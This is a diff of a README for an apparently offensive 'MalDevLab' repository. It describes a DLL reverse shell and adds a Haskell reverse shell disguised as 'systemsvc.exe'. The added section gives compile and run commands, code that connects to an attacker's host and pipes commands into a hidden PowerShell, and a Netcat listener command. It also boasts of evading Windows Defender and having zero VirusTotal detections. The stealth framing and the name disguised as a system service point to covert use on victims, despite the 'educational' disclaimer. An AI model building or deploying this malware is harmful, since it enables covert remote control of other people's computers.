@@ -1,10 +1,22 @@
-# EvasionDLL
-Malicious DLL used for establishing a Reverse TCP Shell 
+# MalDevLab
+
+███╗   ███╗ █████╗ ██╗      ██████╗ ███████╗██╗   ██╗
+████╗ ████║██╔══██╗██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝
+██╔████╔██║███████║██║     ██║   ██║███████╗ ╚████╔╝ 
+██║╚██╔╝██║██╔══██║██║     ██║   ██║╚════██║  ╚██╔╝  
+██║ ╚═╝ ██║██║  ██║███████╗╚██████╔╝███████║   ██║   
+╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   
+       [ MalDevLab - Offensive Security]   
+
 
 ## Overview
-EvasionDLL is a research-focused project demonstrating how **DLL-based reverse shells** can be used to evade detection. 
+Dedicated to malware development and offensive security research. Here, we experiment with various stealthy malware techniques, focusing on topics like reverse shells, bypass mechanisms, DLL injection, and more. This repository is intended for educational purposes and to further the understanding of malware development.
 
+The tools and scripts included are created to simulate various attack scenarios in controlled environments, with an emphasis on evading detection and developing attack methodologies.
 ---
+
+## EvasionDLL - Stealthy DLL-based Reverse Shell
+This is a DLL-based reverse shell that can evade detection by traditional antivirus solutions. The payload is delivered as a DLL that, once loaded into a running process, establishes a reverse connection to the attacker’s machine, providing remote command execution capabilities.
 
 # Detection Status  
 During testing, **Windows 10 and Windows 11 did not flag this DLL as malicious**, allowing it to execute without interference. Standard Windows Defender protections were **bypassed** in a default configuration.  
@@ -122,6 +134,109 @@ These factors make this reverse shell **highly effective at evading detection** 
 - [MITRE ATT&CK: Execution Techniques](https://attack.mitre.org/techniques/T1059/)
 - [Microsoft Security Guidance](https://www.microsoft.com/security/blog/)
 - [DLL Injection Explained](https://attack.mitre.org/techniques/T1055/001/)
+
+---
+
+# systemsvc.exe - Haskell Reverse Shell - Stealthy PowerShell Execution
+
+## Overview  
+This is a **Haskell-based reverse shell** that establishes a connection to a remote server and executes PowerShell commands **stealthily**. Unlike traditional payloads, this implementation uses **Haskell’s process management and socket handling** to launch PowerShell in a **hidden mode**, making it difficult to detect.  
+
+## Detection Status  
+- **0/73 detections on VirusTotal** – No antivirus engines flagged the compiled binary as malicious.  
+- Uses **Haskell runtime** to execute a reverse shell in a way that **minimizes heuristic-based detection**.  
+
+---
+
+## Compiling and Running the Haskell Reverse Shell  
+
+On **Windows**, use:  
+```powershell
+ghc --make systemsvc.hs -o systemsvc.exe -package process -package base
+```
+
+### Executing the Reverse Shell on Windows  
+Once compiled, the executable can be run directly:  
+```powershell
+.\systemsvc.exe
+```
+
+## Code Walkthrough  
+
+### Socket Initialization & Connection  
+```haskell
+addrInfo <- getAddrInfo Nothing (Just remoteHost) (Just remotePort)
+let serverAddr = case addrInfo of
+        (ai:_) -> addrAddress ai
+        []     -> error "Could not resolve address"
+
+sock <- socket AF_INET Stream defaultProtocol
+connect sock serverAddr
+```
+- Resolves the attacker's IP address and port.  
+- Establishes a **TCP connection** to the attacker's machine.  
+
+### Hiding PowerShell Execution  
+```haskell
+let createProcessSpec = (proc "powershell.exe" ["-NoProfile", "-WindowStyle", "Hidden"])
+      { std_in  = CreatePipe
+      , std_out = CreatePipe
+      , std_err = CreatePipe
+      , create_group = True
+      , new_session = True
+      , close_fds = True
+      }
+```
+- **Launches PowerShell in hidden mode**, preventing any visible windows from appearing.  
+- **Disables profiles** (`-NoProfile`) to avoid detection by monitoring tools.  
+
+### Command Execution Loop  
+```haskell
+let forwardOutput h = forever $ do
+    result <- try (hGetLine h) :: IO (Either IOException String)
+    case result of
+        Left _  -> return ()
+        Right line -> do
+            hPutStrLn handle line
+            hFlush handle
+
+forkIO $ forwardOutput hout
+forkIO $ forwardOutput herr
+
+forever $ do
+    cmd <- hGetLine handle
+    hPutStrLn hin cmd
+    hFlush hin
+```
+- **Reads commands from the attacker's machine** and executes them in PowerShell.  
+- **Forwards output back** to the attacker's Netcat listener.  
+- **Runs PowerShell output redirection in separate threads**, ensuring smooth communication.  
+
+---
+
+## Why This Code is Stealthy  
+
+**Fileless Execution Possible** – Can be compiled as a **memory-only payload**.  
+**Bypasses Windows Defender** – No signature-based detections due to Haskell’s low malware footprint.  
+**Minimal Behavioral Footprint** – Runs PowerShell without spawning visible processes.  
+**No Antivirus Detections (0/73)** – Not flagged by VirusTotal.  
+
+---
+
+## Example Listener Setup  
+Before running the reverse shell, set up a Netcat listener on your attack machine:  
+```bash
+nc -nvlp 4444
+```
+Once executed on the target system, you should receive a connection and be able to send PowerShell commands remotely.  
+
+---
+
+## Further Reading  
+
+- [MITRE ATT&CK: Execution Techniques](https://attack.mitre.org/techniques/T1059/)  
+- [Haskell Network Programming](https://hackage.haskell.org/package/network)  
+- [Advanced Malware Techniques](https://www.offensive-security.com/)  
 
 ---
 
